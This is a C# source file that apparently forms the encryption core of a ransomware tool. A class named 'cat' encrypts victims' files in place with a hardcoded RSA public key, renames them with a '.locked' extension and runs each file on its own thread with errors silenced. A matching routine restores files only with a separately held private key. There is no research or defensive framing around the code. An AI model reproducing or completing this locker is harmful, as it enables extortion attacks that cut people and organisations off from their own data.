﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Collections;
using System.Threading;


namespace WindowsFormsApplication1
{
    class cat
    {
        string piravetKey;
        public cat()
        {
        }

        public cat(string x)
        {
            piravetKey = File.ReadAllText(x); ;
        }

        public void EncryptThreatingRSA(string file)
        {
            new Thread(new ParameterizedThreadStart(EncryptFile)).Start(file);

        }

        public void DecryptThreatingRSA(string file)
        {
            new Thread(new ParameterizedThreadStart(DecryptFile)).Start(file);
        }


        public void EncryptFile(object file)
        {
            try
            {
                byte[] dataBytes = File.ReadAllBytes(file.ToString());
                string finalEncryptedData = EncryptString(dataBytes);

                File.WriteAllBytes(file.ToString(), System.Text.Encoding.UTF8.GetBytes(finalEncryptedData));
                File.Move(file.ToString(), file.ToString() + ".locked");
            }
            catch (Exception)
            {
                return;
            }

        }


        public void DecryptFile(object Dir)
        {
            try
            {
                string file = Dir.ToString();
                string text = File.ReadAllText(file.ToString());

                string final = DecryptString(text);

                string result = file.Substring(0, file.Length - ".locked".Length);
                File.WriteAllBytes(file, System.Text.Encoding.UTF8.GetBytes(final));
                File.Move(file, result);
            }
            catch (Exception)
            {
                return;
            }

        }

        public string EncryptString(byte[] inputString)
        {
            string xmlString = "<RSAKeyValue><Modulus>qawYVHHyP+TzZvX2DVojKX586SniuPsLndDqvG+SmLQlWcMOeYVfUPK0sfrl/H4Yd+UmNvhQW6f4MK+gD7FVuyDqgZn+hPwvokQqeOO98e8dQ2oTBbUkCs/ix5cKmgWFHKfz4D8DhlSjo4+r847KP6Imn2YiTwC5dLB8TXsj6QPKchANDkbJNcedOwmLFKlKfc0I+PWvlxn/5ggqv5V3SvzaGuz6wO5cCE3SF1Z+K+4CuK7LNDS7+Kz1H+13Ywd9aWJdS36pDtIC7cHGbh5VA+ANW0OhCsOOvjSghEJVSd4N2CmeoJmsG/wH4F8I/227SALQUtqPNRrajPlS/ery/Q==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

            RSACryptoServiceProvider rsaCryptoServiceProvider = new RSACryptoServiceProvider(2048);
            rsaCryptoServiceProvider.FromXmlString(xmlString);
            int keySize = 2048 / 8;
            byte[] bytes = inputString;
            int maxLength = keySize - 42;
            int dataLength = bytes.Length;
            int iterations = dataLength / maxLength;   // 
            StringBuilder stringBuilder = new StringBuilder();
            for (int i = 0; i <= iterations; i++)
            {
                byte[] tempBytes = new byte[(dataLength - maxLength * i > maxLength) ? maxLength : dataLength - maxLength * i];
                Buffer.BlockCopy(bytes, maxLength * i, tempBytes, 0, tempBytes.Length);
                byte[] encryptedBytes = rsaCryptoServiceProvider.Encrypt(tempBytes, true);
              
                Array.Reverse(encryptedBytes);

                stringBuilder.Append(Convert.ToBase64String(encryptedBytes));
            }
            return stringBuilder.ToString();
        }


        public string DecryptString(string inputString)
        {
            string xmlString = piravetKey;
            byte[] bytes = System.Text.Encoding.UTF8.GetBytes(inputString);
            RSACryptoServiceProvider rsaCryptoServiceProvider = new RSACryptoServiceProvider(2048);
            rsaCryptoServiceProvider.FromXmlString(xmlString);
            int base64BlockSize = ((2048 / 8) % 3 != 0) ? (((2048 / 8) / 3) * 4) + 4 : ((2048 / 8) / 3) * 4;
            int iterations = inputString.Length / base64BlockSize;
            ArrayList arrayList = new ArrayList();
            for (int i = 0; i < iterations; i++)
            {
                byte[] encryptedBytes = Convert.FromBase64String(inputString.Substring(base64BlockSize * i, base64BlockSize));
                Array.Reverse(encryptedBytes);
                arrayList.AddRange(rsaCryptoServiceProvider.Decrypt(encryptedBytes, true));
            }
            return Encoding.UTF8.GetString(arrayList.ToArray(Type.GetType("System.Byte")) as byte[]);
        }
    }//class
}//namespace
